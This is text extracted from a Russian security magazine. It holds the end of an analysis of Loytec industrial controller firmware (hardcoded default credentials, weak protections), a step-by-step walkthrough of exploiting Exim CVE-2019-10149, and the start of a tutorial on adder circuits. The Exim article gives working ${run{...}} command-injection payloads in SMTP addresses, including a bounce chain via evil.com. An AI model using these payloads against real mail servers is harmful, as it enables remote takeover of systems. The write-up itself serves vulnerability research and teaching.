ных 6.4.6 и новейшей 6.4.10. Ключ lighttpd — в прошивках 6.4.6 и 6.4.10.
Видимо, на железке, которая дос талась мне для опытов, его удалили
за ненадобностью.
  С большой долей вероятности те же самые дефол тные ключи могут
работать и с другими устройствами Loytec. Пру фов у меня нет, на этот раз
придется все же пох вастать ся чуть ем. :‐)


        WWW

                 О  lighttpd  и  веб‐разработ ке  на C++ можно
                        почитать здесь. За ссылку и пару инте ресных
                      идей спасибо Sailor.


Если продолжать прочесывать строки в руках с grep и, в частнос ти, поискать
default password, то можно снова увидеть зна комый фай лик linx_at91_pri‐
mary.exe. Лишнее подтверждение тому, что это главный кандидат для ревер‐
са.
   Также  я бы советовал вос пользовать ся командой hardening‐check
elf_file_to_check. Она про веря ет ELF на функции безопас ности. Под‐
робности можешь посмотреть в man.





И снова видим, что при компиляции не ста ли использовать флаги GCC,
которые помогли бы снизить риски от бинарных уяз вимос тей.


        WWW

                 О том, какие параметры GCC помогут усилить
                        защиту, ты можешь узнать, нап ример, в блоге
                     Red Hat или в неплохой подборке пользовате ля
                             relo на GitHub.


Ну и раз мы пока используем штатные команды Linux, посмотрим, что еще они
могут нам сказать полезного при ана лизе.


$file name_file





$ readelf ‐l name_file





Зиродеев, конечно, мы не увидим, но вот качес тво кода тут явно несовмести‐
мое с безопасностью, в час тнос ти стек имеет флаг execute. Не забываем,
что железки такого рода стоят на промышленных объектах и их выход из строя
может нанести значитель ный урон.
  Следующее интересное место, куда стоит заглянуть, — это каталог /etc/
init.d. Тут нам попада ется интерес ный файлик по име ни S35firewall.
Здесь содержатся правила файрво ла. Ана лиз этого файла и информации
из других каталогов показывает, что каких‐либо серь езных правил противо‐
действия банальному брутфорсу или DDoS здесь нет. Не встре тились также
и fail2ban или sshguard, которые хоть как‐то помогут бороться с напастью.
Причем это характерно для всех прошивок: 6.1.2, 6.4.6, 6.4.10. То есть
получается, что вычислитель ные ресурсы есть, а задействовать их вендор
поленился.
   Теперь поговорим немного про ана лиз угроз со стороны веб‐интерфейса.
Так как устройство у нас рядом, можно подклю читься к нему по SSH и пос‐
мотреть изнутри, какие порты открыты:


$ netstat ‐ntulp





Помнишь, несколь ко абзацев рань ше я говорил, что будет еще одна подсказ‐
ка, которая поможет выявить важные бинарные фай лы, кандидаты на реверс?
Так вот, запустим команду top и пос мотрим на ее вывод.





Как видишь, процесс, который отбирает больше всего CPU, — это уже извес‐
тный нам файл linx_at91_primary.exe.
  Открываем веб‐интерфейс. Ког да мы попадаем на главную страничку,
видим, что даже в гостевом режиме предос таточно информации для начина‐
ющего хакера. :‐)





Отсюда можно узнать, какая версия прошивки запущена и на какую можно
откатиться назад (графа Fallback), как сконфигурировано устройство, его
сетевые настройки и прочие полезные шту ки. Например, информация о том,
что порт USB запрещен, но при этом разрешены KNXnet/IP, BACnet/IP, SNMP
и прочие протоколы.


             INFO

                   В одном из чатиков по инфобезу АСУ ТП мне
                       очень понравилась предложенная расшифровка
                      аббревиатуры SNMP — Security Not My Problem.


Чтобы получить полный дос туп, логинимся, используя штатный пароль,
и вуаля. Твори, что хочешь! Эмпиричес ким путем было установлено, что
минимальная длина пароля может быть… барабанная дробь… один символ!





                        Так и хочется вос кликнуть

Максимальная длина пароля может дос тигать 15 символов; радует, что мож‐
но использовать спецсимво лы и зна ки препинания. Но не забываем, что
никаких защит от брутфорса нет, поэто му если другого способа не найдется
или ты захочешь временно заняться чем‐то другим, то можешь в таких слу‐
чаях запускать брутилку паролей.
  Помимо этого, держим в голове, что общение с этим устройством про‐
исходит через HTTP, FTP и подобные протоко лы. Это явно не добавляет
секурности.
  Для того чтобы определить воз можные векторы атак через веб, можно
воспользоваться OWASP ZAP (ну или Burp, кому что нравится). Тем более что
простор для деятельнос ти имеется.





Не стоит забывать и про еще один вектор ата ки: когда у злоумышленника есть
непосредственный дос туп к устройству. У него всего одна ручка‐крутилка,
но она открывает широчайшие воз можнос ти.





«Кручу, верчу, любые нас тройки тво рю!»





Видимо, делается ставка на то, что железный шкаф будет надежно защищать
устройство от физического дос тупа. Впро чем, это оставляет для потенциаль‐
ного злоумышленника воз можность покопаться в этих меню, например
во время транспортировки устройства.
  И напоследок пара слов про реверс linx_at91_primary. Когда мы
при помощи grep искали строки и смотрели, где может встретиться loytec4u,
нам попался этот ELF. И неспроста! По каким‐то невиданным причинам вен‐
дор решил захар дкодить дефолтные креды пря мо в бинарном файле.





Также, вооружив шись отладчиком, мы без тру да находим пару функций, свя‐
занных с обновлением прошивки.





Кстати, рекомен дую применять «дифференциаль ный диагноз» — одновре‐
менно использовать IDA Pro, Ghidra и Radare2. Быва ет, что какой‐то из них
выдает лучший результат по одной из функций или участку кода в одном и том
же бинарнике.
   Анализ функции firmware_update_from_file показы вает, что какой‐либо
серьезной проверки на подлинность или целос тность тоже нет. Помимо этого
файла, есть и другие кандидаты для реверса.





Меня очень инте ресует как раз knxstack‐xx и atmega_prog, но о них погово‐
рим как‐нибудь в другой раз.
  В заключение вместо того, что бы сетовать, как все печально в сфере
индастриал, лучше напишу небольшой читшит, который тебе поможет сори‐
ентироваться на неизвестной железке при уда ленном поиске багов:
 • dmesg
 • df h
 • ps ax
 • ls l /dev/
 • lsmod
 • uname a
 • cat /proc/cpuinfo
 • lsof
 • lsusb

Ну а чтобы теория хорошо закрепилась, вот нес колько мест, где можно отта‐
чивать свои навыки. Хотя допус каю, что у тебя все это уже может быть в зак‐
ладках и ты уже прорешал все эти crackme. :‐)
 • Exelab — логин любой, пароль 999;
 • Root Me;
 • Pwnable;
 • Wargames.

И отдельно хочу упомянуть ребят с конференции Paymentsecurity, которые
организуют хороший Practical Security Village, где ты можешь вмес те с еди‐
номышленниками потрениро вать свои практические навыки в области пен‐
теста.


                                     Продолжение статьи →
ВЗЛОМ

ОТПРАВЛЯЕМ
КОМАНДЫ
                        КАК ЗАСТАВИТЬ
    ПОПУЛЯРНЫЙ СЕРВЕРНЫЙ ПОЧТОВИК
       ВЫПОЛНЯТЬ ПРОИЗВОЛЬНЫЙ КОД





                                                 aLLy
                                              ONsec
                                                    @iamsecurity





В этой статье я расскажу об уязвимости в агенте пересылки
сообщений Exim. Найденная брешь позволяет атакующему
выполнить произвольный код на целевой системе, что само
по себе очень опасно, а если Exim был запущен от рута, то
успешная экс плуатация позволяет получить максимальный
контроль над сис темой.


Я уже дважды писал об RCE в этом почтовом сервере: один раз —
в 2017 году, второй — в 2018‐м. Оба раза для успешной эксплуатации нужно
было разбираться со смещениями, кучами и прочей бинарщиной. В этот раз
для проведения атаки дос таточно просто отправить письмо через уяз вимый
Exim на специально сформированный адрес, содержащий пейлоад.
   Если вкратце, то атака основана на внедрении произвольных сущ ностей
в expanded strings, в заголовки RCPT TO и MAIL FROM. Она позволяет зло‐
умышленнику передать специально сформированную строку как email‐адрес,
и та будет интерпретирована почтовым сервисом как системная команда.


             INFO

                       Баг обнаружили спе циалисты из Qualys в конце
                     мая это го года. Он получил номер CVE‐2019‐
                       10149   и   затрагивает   все   версии   Exim
                        с 4.87 до 4.91 включительно.



СТЕНД
Для создания тестового окружения воспользуемся контейнером Docker.
На момент публикации уяз вимос ти пакеты Exim, которые лежали в репози‐
тории Debian, содержали данную брешь. Они уже запатчены, поэтому нам
нужно будет собрать уязвимую версию из исходников.


$ docker run ‐it ‐‐rm ‐p25:25 ‐‐name=eximrce ‐‐hostname=eximrce ‐‐cap‐add=
SYS_PTRACE ‐‐security‐opt seccomp=unconfined debian /bin/bash

Расшариваем 25‐й порт наружу, чтобы в дальнейшем можно было протес‐
тировать удален ную ата ку. Помимо это го, добавляем флаги, чтобы можно
было отлаживать приложение.
   Теперь устанавливаем необходимые зависимости для успешной ком‐
пиляции.


$ apt‐get install ‐y exim4 build‐essential git libdb5.3‐dev libpcre3‐dev
libgnutls28‐dev libgcrypt‐dev wget netcat nano procps gdb

Обрати внимание, что я установил Exim4 из репозитори ев. Это нужно
для того, чтобы не возиться с конфигурационным файлом, добавлением
пользователей и прочими приготовлениями.
  Выполняем базовую нас тройку почтового сервера.


$ dpkg‐reconfigure exim4‐config





                   Первичная нас трой ка Exim4

Важный параметр — Domains to relay mail for. Запомни его, я вернусь
к нему на этапе удаленной эксплуата ции.
   Теперь восполь зуемся репозиторием Exim4 на GitHub и клониру ем пос‐
леднюю уязвимую ветку — 4.91.


$ git clone ‐‐depth=1 ‐b exim‐4_91 https://github.com/Exim/exim.git
$ cd exim/src
$ mkdir Local

Скопируем дефолтный шаблон мейкфайла.


$ cp src/EDITME Local/Makefile

В него нужно внести пачку изменений для того, что бы скомпилировать мак‐
симально соответствующий существу ющему конфигу бинарник. Сначала ука‐
жем имя пользователя, от которо го будет работать Exim. Если ставить
из репозиториев, то скрипт уста новки создает поль зователя Debian‐exim.
Его и указываем.


$ sed ‐i 's,^EXIM_USER.*$,EXIM_USER=Debian‐exim,' Local/Makefile

Отключаем Exim Monitor, так как это гра фическая утилита для прос мотра
информации о работе демона и в консоли она нам совершенно ни к чему.


$ sed ‐i 's,^EXIM_MONITOR=.*$,# EXIM_MONITOR=,' Local/Makefile

Указываем директорию, в которой лежат бинарники.


$ sed ‐i 's,^BIN_DIRECTORY=.*$,BIN_DIRECTORY=/usr/sbin,' Local/Makefile

Теперь указываем путь до файла конфигурации. Я сгенерировал его через
утилиту exim4‐config, которая записывает его в /var/lib/exim4/config.
autogenerated.


$ sed ‐i 's,^CONFIGURE_FILE=.*$,CONFIGURE_FILE=/var/lib/exim4/config.autoge
nerated,' Local/Makefile &&

Дальше идут не особенно важные нас тройки.


sed ‐i 's,^# SUPPORT_MAILDIR,SUPPORT_MAILDIR,' Local/Makefile && \
sed ‐i 's,^# SUPPORT_MAILSTORE,SUPPORT_MAILSTORE,' Local/Makefile && \
sed ‐i 's,^# SUPPORT_MOVE_FROZEN_MESSAGES,SUPPORT_MOVE_FROZEN_MESSAGES,'
Local/Makefile && \
sed ‐i 's,^# SUPPORT_TLS=,SUPPORT_TLS=,' Local/Makefile && \
sed ‐i 's,^# USE_GNUTLS=,USE_GNUTLS=,' Local/Makefile && \
sed ‐i 's,^# TLS_LIBS=‐lgnutls,TLS_LIBS=‐lgnutls,' Local/Makefile && \
sed ‐i 's,^# LOOKUP_CDB,LOOKUP_CDB,' Local/Makefile && \
sed ‐i 's,^# LOOKUP_DSEARCH,LOOKUP_DSEARCH,' Local/Makefile && \
sed ‐i 's,^# LOOKUP_NIS,LOOKUP_NIS,' Local/Makefile && \
sed ‐i 's,^# LOOKUP_NISPLUS,LOOKUP_NISPLUS,' Local/Makefile && \
sed ‐i 's,^# LOOKUP_PASSWD,LOOKUP_PASSWD,' Local/Makefile && \
sed ‐i 's,^# TRANSPORT_LMTP,TRANSPORT_LMTP,' Local/Makefile && \
sed ‐i 's,^# AUTH_CRAM_MD5,AUTH_CRAM_MD5,' Local/Makefile && \
sed ‐i 's,^# AUTH_PLAINTEXT,AUTH_PLAINTEXT,' Local/Makefile && \
sed ‐i 's,^# HAVE_IPV6,HAVE_IPV6,' Local/Makefile

Изменяем директорию,  в которую  будет  скла дываться очередь писем
для отправ ки.


$ sed ‐i 's,^/var/spool/exim,/var/spool/exim4,' Local/Makefile

И пос леднее изменение — нуж но добавить флаг ‐g, если ты хочешь отла‐
живать приложе ние.


$ printf "CFLAGS  += ‐g\n" >> Local/Makefile

Дальше дело за компиляцией.


$ make





                    Ус пешная компиляция Exim 4.91

После того как приложение успешно скомпилено, нужно заменить бинарник
Exim, который я ставил из репозитория Debian.


$ mv /usr/sbin/exim4 /usr/sbin/exim4_orig && cp ‐f /root/exim/src/
build‐Linux‐x86_64/exim /usr/sbin/exim4

Стенд готов. Теперь ты можешь запускать демон Exim в качес тве сервиса
или напрямую из командной строки с выводом информации о работе в кон‐
соль.


$ exim4 ‐bdf ‐d+all




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

       ОТПРАВЛЯЕМ
         КОМАНДЫ
                                   КАК ЗАСТАВИТЬ
              ПОПУЛЯРНЫЙ СЕРВЕРНЫЙ ПОЧТОВИК
                ВЫПОЛНЯТЬ ПРОИЗВОЛЬНЫЙ КОД





ДЕТАЛИ УЯЗВИМОСТИ И ЛОКАЛЬНАЯ ЭКСПЛУАТАЦИЯ
Сначала я расскажу о самом прос том способе экс плуатации — локальном.
Попутно разберем, в чем же именно причина уязвимости.
  В окружении сервера Exim есть такое понятие, как String Expansion. Грубо
говоря, это аналог макросов, как в разных шаблонизаторах. Строки спе‐
циального вида, которые обра батываются парсером Exim. Среди множества
команд и функций, которые дос тупны в рамках String Expansion, имеется
вызов внешней программы — run.


${run{<команда> <аргументы>}{<string1>}{<string2>}}

Сам парсинг выпол няется функцией expand_string.


src/src/expand.c
7659: uschar *
7660: expand_string(uschar * string)
7661: {
7662: return US expand_cstring(CUS string);
7663: }


src/src/expand.c
7640: const uschar *
7641: expand_cstring(const uschar * string)
7642: {
7643: if (Ustrpbrk(string, "$\\") != NULL)
7644:   {
7645:   int old_pool = store_pool;
7646:   uschar * s;
7647:
7648:   search_find_defer = FALSE;
7649:   malformed_header = FALSE;
7650:   store_pool = POOL_MAIN;
7651:     s = expand_string_internal(string, FALSE, NULL, FALSE, TRUE, NULL)
;
7652:   store_pool = old_pool;
7653:   return s;
7654:   }
7655: return string;
7656: }

Среди огромного количества мест, где она вызывается, есть такое место и в
deliver_message.


src/src/deliver.c
5505: int
5506: deliver_message(uschar *id, BOOL forced, BOOL give_up)
5507: {
...
6224: #ifndef DISABLE_EVENT
6225:       if (process_recipients != RECIP_ACCEPT)
6226:   {
6227:   uschar * save_local =  deliver_localpart;
6228:   const uschar * save_domain = deliver_domain;
6229:
6230:   deliver_localpart = expand_string(
6231:             string_sprintf("${local_part:%s}", new‐>address));
6232:   deliver_domain =    expand_string(
6233:             string_sprintf("${domain:%s}", new‐>address));
6234:
6235:   (void) event_raise(event_action,
6236:             US"msg:fail:internal", new‐>message);
6237:
6238:   deliver_localpart = save_local;
6239:   deliver_domain =    save_domain;
6240:   }

Как видишь, эта ветка компилиру ется в случае, когда символичес кая констан‐
та DISABLE_EVENT не определена. Так оно и есть, начиная с версии 4.87
Events — полноправная часть Exim и используются по умол чанию.


doc/doc-txt/ChangeLog
674: Exim version 4.87
675: ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
...
799: JH/29 Move Events support from Experimental to mainline, enabled by
default
800:       and removable for a build by defining DISABLE_EVENT.


doc/doc-docbook/spec.xfpt
39868: Most installations will never need to use Events.
39869: The support can be left out of a build by defining DISABLE_EVENT=yes
39870: in &_Local/Makefile_&.


src/src/EDITME
456: # To disable support for Events set DISABLE_EVENT to "yes"
457:
458: # DISABLE_EVENT=yes

Напомню, что на основе файла src/src/EDITME я делал мейкфайл для ком‐
пиляции Exim.
  Посмотрим на сам код, он начина ет работать только в том случае, если
переменная process_recipients не равна RECIP_ACCEPT. Но при ини циали‐
зации она принимает как раз такое зна чение.


src/src/deliver.c
5505: int
5506: deliver_message(uschar *id, BOOL forced, BOOL give_up)
5507: {
...
5513: int process_recipients = RECIP_ACCEPT;

Исправить этот «недостаток» можно несколькими способами. Относительно
простой — это передать большое количество хидеров Received в письме.


src/src/deliver.c
5818: /* Otherwise, if there are too many Received: headers, fail all recipi
ents. */
5819:
5820: else if (received_count > received_headers_max)
5821:   process_recipients = RECIP_FAIL_LOOP;

Нужно, чтобы их было больше, чем максималь но допустимое значение,
которое хранится в переменной received_headers_max. По умолчанию оно
равно 30.


src/src/globals.c
1131: int     received_headers_max   = 30;

Хватит сухих сор цов, давай попробуем это на практике. Для отправки писем я
буду использовать обычный netcat.


nc localhost 25

Проявим вежливость и поздорова емся.


EHLO localhost

Указываем отправителя (точнее, что его нет).


MAIL FROM:<>

И получателя. Запомни этот адрес, он нам еще пригодится.


RCPT TO:<hellothere@localhost>

Теперь отправляем данные.


DATA

В дело вступает 31 заголо вок Received.


Received: 1
Received: 2
Received: 3
...
Received: 31


.

Завершаем работу и разрываем соединение.


QUIT

В отладчике я поставил брейк‐пойнт на функцию deliver_message. Давай
посмотрим, что происходит при обра ботке и отправке этого письма.





               Отладка функции deliver_message в Exim

Количество заголовков превышает максимум, а зна чит, process_recipients
установлено в нужное зна чение. Продолжаем трей сить выполнение прог‐
раммы и попадаем в интересующее нас усло вие.





       Отладка функции deliver_message. Попали в нужное условие

Адрес, который мы указывали в качестве получателя (RCPT TO), находится
в new‐>address и затем попадает в функцию expand_string в виде сле‐
дующего выражения:


${local_part:hellothere@localhost}





          Адрес отправителя попадает в функцию expand_string

Если я передам вместо почты какую‐нибудь конструкцию string expansion, то
она будет тоже обработа на, ибо никакой филь тра ции не предусмотре но.
Таким образом можно выполнять функции, например упомянутую выше run.
Для начала укажем какую‐нибудь прос тую команду.


${run{/bin/sh ‐c "id > /tmp/id"}}@localhost

Однако на этапе переда чи этого адреса сервер ругнется на ошибку син‐
таксиса — пробелы недопус тимы.





         Ошибка в адресе получателя. Пробелы недопустимы

К счастью, синтаксис поз воляет экранировать любые символы, указывая их
в виде hex, как, например, в Python. Поэтому адрес превращается в нечто
подобное:


${run{\x2fbin\x2fsh\t‐c\t\x22id\t\x3e\t\x2ftmp\x2fid\x22}}@localhost

Теперь сервер считает этот email валид ным.





             Внедрение пейлоада в expansion string в Exim

И если продолжить выполнение потока программы, то наша команда id
выпол нится.





             Выполнение произволь ных команд в Exim

Если сделать листинг директории /tmp, то выяснится, что здесь лежит файл id
с результатами работы одноименной команды. Владелец этого файла —
пользователь, от которого запущен демон exim. Если он работает от root, то
мы получаем полный дос туп к системе. Существу ет директива deliver_‐
drop_privilege, которая понижа ет привилегии процес са отправки, но по
дефолту она установлена в false.


src/src/globals.c`
637: BOOL    deliver_drop_privilege = FALSE;





  Успешное выпол нение команды от пользователя, под которым работает
  Exim

На данный момент уже существу ет нес колько автоматизированных скриптов
для эксплуатации уязвимос ти. Например, raptor_exim_wiz за авторством Мар‐
ко Ивальди (Marco Ivaldi) AKA Raptor, имеющий два режима работы — соз‐
дание suid и бэкшелл с помощью netcat. Эксплоит написан на bash, поэтому
ты без труда смо жешь разобраться и подогнать его под свои нужды, если
это необходимо.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

       ОТПРАВЛЯЕМ
         КОМАНДЫ
                                   КАК ЗАСТАВИТЬ
              ПОПУЛЯРНЫЙ СЕРВЕРНЫЙ ПОЧТОВИК
                ВЫПОЛНЯТЬ ПРОИЗВОЛЬНЫЙ КОД





УДАЛЕННОЕ ВЫПОЛНЕНИЕ КОМАНД И ОГРАНИЧЕНИЯ
А что насчет удаленной эксплуата ции? Тут все сильно зависит от конфигура‐
ции, с которой ты име ешь дело. Например, конфигурация по умолчанию тре‐
бует, чтобы пользователь, которому отправляется email, существовал в сис‐
теме. За это отвечает опция verify = recipient.





              Для RCE локальный метод не срабатывает

Но бывают конфигурации, где эта опция отсутству ет по тем или иным при‐
чинам. Например, администратор защищается от атак user enumeration. Если
тебе так повезло, то можешь использовать для экс плуатации локальный
метод.
  Еще один вариант подойдет в том случае, если конфигурация раз решает
использовать суффиксы к почтовым адресам, как, например, на Яндексе —
vasyan+xakep@yandex.ru. За такое поведение отвечает опция local_‐
part_suffix.


local_part_suffix = +*
local_part_suffix_optional

Если суффикс указан, то эксплуата ция локальным способом снова становится
возможной. Для это го до суффикса нужно указать реально существу ющего
в системе пользователя.


root+${run{\x2fbin\x2fsh\t‐c\t\x22id\t\x3e\t\x2ftmp\x2fidsuff\x22}}@localh
ost





  При включенной опции local_part_suﬃx можно передать пейлоад
  и выполнить RCE

Остается еще один вариант экс плуатации для нес тандартной конфигурации.
Возможно, на сервере нас троена пересылка сооб щений куда‐либо (relay).
Эту опцию можно указать на этапе генерации конфига. Для тестового стенда
я указал, что сервер является почтовым узлом до ya.ru.





                 Нас трой ка пересылки почты в Exim

Теперь можно исполь зовать этот домен в пейлоаде, и такой ящик без проб‐
лем будет принят и обра ботан.


${run{\x2fbin\x2fsh\t‐c\t\x22id\t\x3e\t\x2ftmp\x2fid_relay\x22}}@ya.ru





                RCE в Exim с нас троенным relay


RCE ПРИ ИСПОЛЬЗОВАНИИ КОНФИГА ПО УМОЛЧАНИЮ
Переходим к заключитель ной час ти. Возможна ли удаленная эксплуатация
при дефолтной конфигура ции? Сразу спойлер: да, но вероятность крайне
мала сразу из‐за двух проблем.
  Первая проблема с проверкой сущес твования пользователя решается
при помощи возвращенного письма (bounce message). Если письмо не было
доставлено, то оно возвра щается к отправителю. Здесь в поле получателя
(RCPT TO) используется ящик отправителя (MAIL FROM оригинального пись‐
ма). Разуме ется, мы можем взять в качес тве отпра вителя любые значения,
не противоречащие фор мату адреса. Поэто му там можно указать пейлоад.
   Вторая проблема: нам нужно сделать так, чтобы переменная process_re‐
cipients отличалась от RECIP_ACCEPT, иначе не попасть в уязвимую часть
кода. Только вот трюк с превышением максимального количества заголовков
уже не прокатит, так как нет возможнос ти управлять заголовками возвращен‐
ного письма.
  В коде нашлась интерес ная логика, которая позволя ет обойти эту проб‐
лему: если возвращен ное письмо не будет доставлено спус тя семь дней,
Exim устанавливает переменную process_recipients в значение RECIP_‐
FAIL_TIMEOUT.





   Дефолтное значение переменной timeout_frozen_after в конфиге Exim

Трюк основан на том, что дефолтное значение timeout_frozen_after —
это 7d. Но здесь подстерега ет еще одна проблема, на этот раз посерьезней.
Если проблемой при дос тавке пись ма был не временный сбой, то по исте‐
чении двух дней статус возвра щенного пись ма меняется на отложенный (de‐
fer). Именно такой срок по дефолту имеет нас тройка ignore_bounce_er‐
rors_after.





  Дефолтное значение переменной ignore_bounce_errors_after в конфиге
  Exim


src/src/deliver.c
1682:   /* If this is a delivery error, or a message for which no replies
are
1683:   wanted, and the message’s age is greater than ignore_bounce_e
rrors_after,
1684:   force the af_ignore_error flag. This will cause the address to be
discarded
1685:   later (with a log entry). */
1686:
1687:   if (!*sender_address && message_age >= ignore_bounce_errors_after)
1688:     addr‐>prop.ignore_error = TRUE;

Exim будет пытаться повторить отправку пись ма с таким статусом. По умол‐
чанию максимальный срок установлен в четыре дня.





  Расписание повторной отправки писем в Exim‐конфиге из Debian‐
  репозитория

По истечении этого времени письмо будет отменено и сервер больше
не будет пытаться его доставить. То есть до семидневного срока он
не дотянет. Ребята из Qualys придумали интересную цепочку, чтобы обойти
все перечисленные ограничения.
   Алгоритм эксплуатации выглядит следующим обра зом.
  Подклю чаемся к серверу и отправляем пись мо, которое не может быть
доставлено. Для этого используем трюк с большим количеством хидеров Re‐
ceived. В этот раз пейлоад записываем в MAIL FROM, а в качестве домена
используем подконтроль ный нам.


${run{...}}@evil.com

Получателем (RCPT TO) можно ука зать postmaster, этот псевдопользователь
существует по дефол ту.
   Так как при доставке сообщения будет воз никать ошиб ка, то Exim при‐
соединится к поч товому агенту на нашем сервере и попытается вернуть пись‐
мо на ящик отправите ля (в имени которого пейлоад).
   Теперь самое интересное. Exim отправляет нашему серверу SMTP‐коман‐
ды и ждет ответов. Нам нужно держать это соединение открытым семь дней.
По дефолту Exim читает ответ от сервера час тями по 8192 байт. За размер
частей отвечает DELIVER_BUFFER_SIZE.


src/src/config.h.defaults
46: #define DELIVER_IN_BUFFER_SIZE     8192
47: #define DELIVER_OUT_BUFFER_SIZE    8192

Тайм‐аут на чтение уста новлен в пять минут — переменная command_timeout.


src/src/transports/smtp.c
215: smtp_transport_options_block smtp_transport_option_defaults = {
...
251:   .command_timeout =       5*60,

Разумеется, счетчик тайм‐аута сбра сывается при получении любого количес‐
тва информации. Поэто му нужно отправлять серверу по бай ту каждые четыре
минуты.
  После того как пройдет семь дней, нуж но ответить уяз вимому серверу
какой‐то неразрешимой ошибкой. Например, 550  Unrouteable  address.
Это значит, что почтового ящика с таким адресом не сущес твует и смысла
в дальнейших попытках отправки нет. Возвращенное письмо благодаря
такому трюку зависнет в  пуле. Функция post_process_one должна бы
пометить его как отмененное, потому что прошло больше двух дней после
создания сообщения (ignore_bounce_errors_after).


src/src/deliver.c
1687:   if (!*sender_address && message_age >= ignore_bounce_errors_after)
1688:     addr‐>prop.ignore_error = TRUE;

В сложившихся обстоятельствах переменная message_age будет содержать
не реальное время соз дания возвращенного письма, а то, когда оно было
последний раз загружено из очереди Exim. Это означает, что вместо семи
дней возраст письма равен нескольким минутам или даже  секундам,
в зависимости от того, ког да пос ледний раз вызыва лась очередь.
  В итоге условие не отрабатывает и письмо переходит в очередь задер‐
жанных и замороженных.


src/src/deliver.c
1696:   if (  !addr‐>prop.ignore_error
1697:      && (  addr‐>special_action == SPECIAL_FREEZE
1698:         || (sender_address[0] == 0 && !addr‐>prop.errors_address)
1699:      )  )
1700:     {
1701:     frozen_info = addr‐>special_action == SPECIAL_FREEZE
1702:       ? US""
1703:       : sender_local && !local_error_message
1704:       ? US" (message created with ‐f <>)"
1705:       : US" (delivery error message)";
1706:     deliver_freeze = TRUE;
1707:     deliver_frozen_at = time(NULL);
1708:     update_spool = TRUE;

Наконец, при сле дующей обработке очереди замороженное письмо будет
загружено, и в этот раз его возраст будет установлен корректно. То есть
получится, что он будет больше семи дней и больше дефол тного значения
timeout_frozen_after. Переменная process_recipients примет отличное
от RECIP_ACCEPT значение, чего, собственно, мы и добивались.


src/src/deliver.c
5725:   if (timeout_frozen_after > 0 && message_age >= timeout_frozen_after)
5726:     {
5727:     log_write(0, LOG_MAIN, "cancelled by timeout_frozen_after");
5728:     process_recipients = RECIP_FAIL_TIMEOUT;
5729:     }

Дальше все как при локальной эксплуата ции: в функцию expand_string
попадет наш пейлоад (${run{...}}@evil.com) из адре са отправителя и код
выпол нится.
   Если инте ресно, можешь сам набросать эксплоит для реализации этого
алгоритма атаки. А чтобы при отладке каждый раз не сидеть и не ждать
по семь дней, как Самара, советую поменять все опции, связанные со вре‐
менем (ignore_bounce_errors_after, timeout_frozen_after, рас писание
повторной отправки) на более короткие промежут ки.
  Не исключено, что существует возможность про эксплуатировать дефол‐
тную конфигурацию гораз до быстрее. Возможно, именно ты найдешь этот
способ, так что дерзай.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ЗАКЛЮЧЕНИЕ
Итак, мы изучили интересную уязвимость сервера Exim 4.91 и разные техники
ее эксплуатации. Разработчикам даже не приш лось реаги ровать на сооб‐
щение о баге, так как к этому времени он был исправлен заод но с другой уяз‐
вимостью. Коммит от 17 сентября 2018 года, кроме бага 2310, фиксит и изу‐
ченную нами проблему. Этот коммит был сделан в предрелизную (RC1) вер‐
сию Exim 4.92, которая окончательно вышла 10 февраля 2019 года. Поэтому
она неэксплуатабельна.
  Помимо этого, разработчики выпус тили пат чи для всех существу ющих вер‐
сий почтового демона. Обра ти внимание, что версии ниже 4.87 тоже можно
эксплуатировать, если при компиляции была определена директива EXPERI‐
MENTAL_EVENT.
   Так что почаще проверяй свое окру жение на наличие известных брешей
и своевременно накатывай патчи.
ТРЮКИ
ОСНОВЫ
ЦИФРОВОЙ
СХЕМОТЕХНИКИ


СОБИРАЕМ СУММАТОР
С УСКОРЕННЫМ ПЕРЕНОСОМ
ИЗ ДИСКРЕТНЫХ МИКРОСХЕМ





                                                                                         faberge
                                                                           Цифровыхъ дѣлъ мастеръ
                                                                                          fabulous.faberge@yandex.ru





У современных программистов нет необходимости знать
устройство компьютера на самом низком уровне, и все же
без этого чувс твуешь, что упустил  что‐то важ ное. Увы,
в одной статье я не смогу рассказать о том, как работает
даже самый примитив ный процессор, поэтому мы начнем
с  изучения  сумматора —  ключевого  элемен та  ариф‐
метико‐логического   устройства   (АЛУ).  Пробежавшись
по теории, мы перейдем к практике: познакомим ся с мик‐
росхемой 74HC283 и соберем на макетной плате неболь‐
шой тестовый стенд.


Говорят, древние программисты собира ли свои компьютеры самос тоятель‐
но, уверенно обращались с паяльником и зна ли ассемблер. Но потом эти
умения были безвозвратно пог ребены под слоями абстракции, и теперь каж‐
дый — специалист в узкой области, который редко заглядывает дальше ее.
Если ты не работаешь с железом, то схемотехника тебе вряд ли пригодится
сама по себе. Так зачем ее учить? Попробую показать на примере.
  Знаешь, что изоб ражено на этой картинке?





Так выглядит руль болида «Формулы‐1». Нетрудно догадаться, что у пилота
за таким штурвалом совершенно иной уро вень подготовки. И речь не о ско‐
рости реакции или рефлексах: тут абсолютно другое, качес твенно более глу‐
бокое понимание принципов и особен ностей работы машины.
  Знания пилота «Формулы‐1» — это и немного знаний конс труктора,
и инженера, и механика. Только так можно выжать из этого автомобиля мак‐
симум и нестись по трассе на огромной ско рости под вос хищенные крики
болельщиц. Примерно то же и со схемотехникой: без нее ты просто скучный
современный водитель, от которо го скрыли устройство его машины.
   Лично мне цифровая схемотехника дала многое. Я, например, узнал, что
собой представляет конвейер в процессоре, почему его сброс дорого обхо‐
дится для исполняемой программы и как выглядит компромисс времени
и памяти на аппаратном уровне. Если мне уда лось тебя убедить и ты тоже
хочешь хоть немного овладеть этой наукой, то приступим!


ФОРМА СИГНАЛА
Схемотехнику принято делить на две большие области: цифровую и аналого‐
вую, по типу сигнала. Ана логовая опериру ет такими параметрами, как сила
тока, напряжение (иног да оно быва ет отрицатель ным) и сопротивление.
В цифровой все проще — в схеме есть только высокий и низ кий логичес кие
уровни, даже без конкрет ных значений.
  В С/С++ подобное отношение моделирует тип bool и два его сос‐
тояния — true и false. Я и дальше буду использовать аналогии из язы ков
программирования, где это уместно. Надеюсь, это поможет тебе лучше
понять происходящее. Кроме того, это ярко показывает, насколько тесно все
связано в цифровом мире.
   Аналоговая схемотехника капризна и непредсказуема — на параметры
сигнала могут влиять не только хорошо известные факторы вроде температу‐
ры и внешних наводок, но и даже такие неочевидные вещи, как вовремя
не отмытый с платы флюс или окислившиеся контакты (без шуток). Цифровая
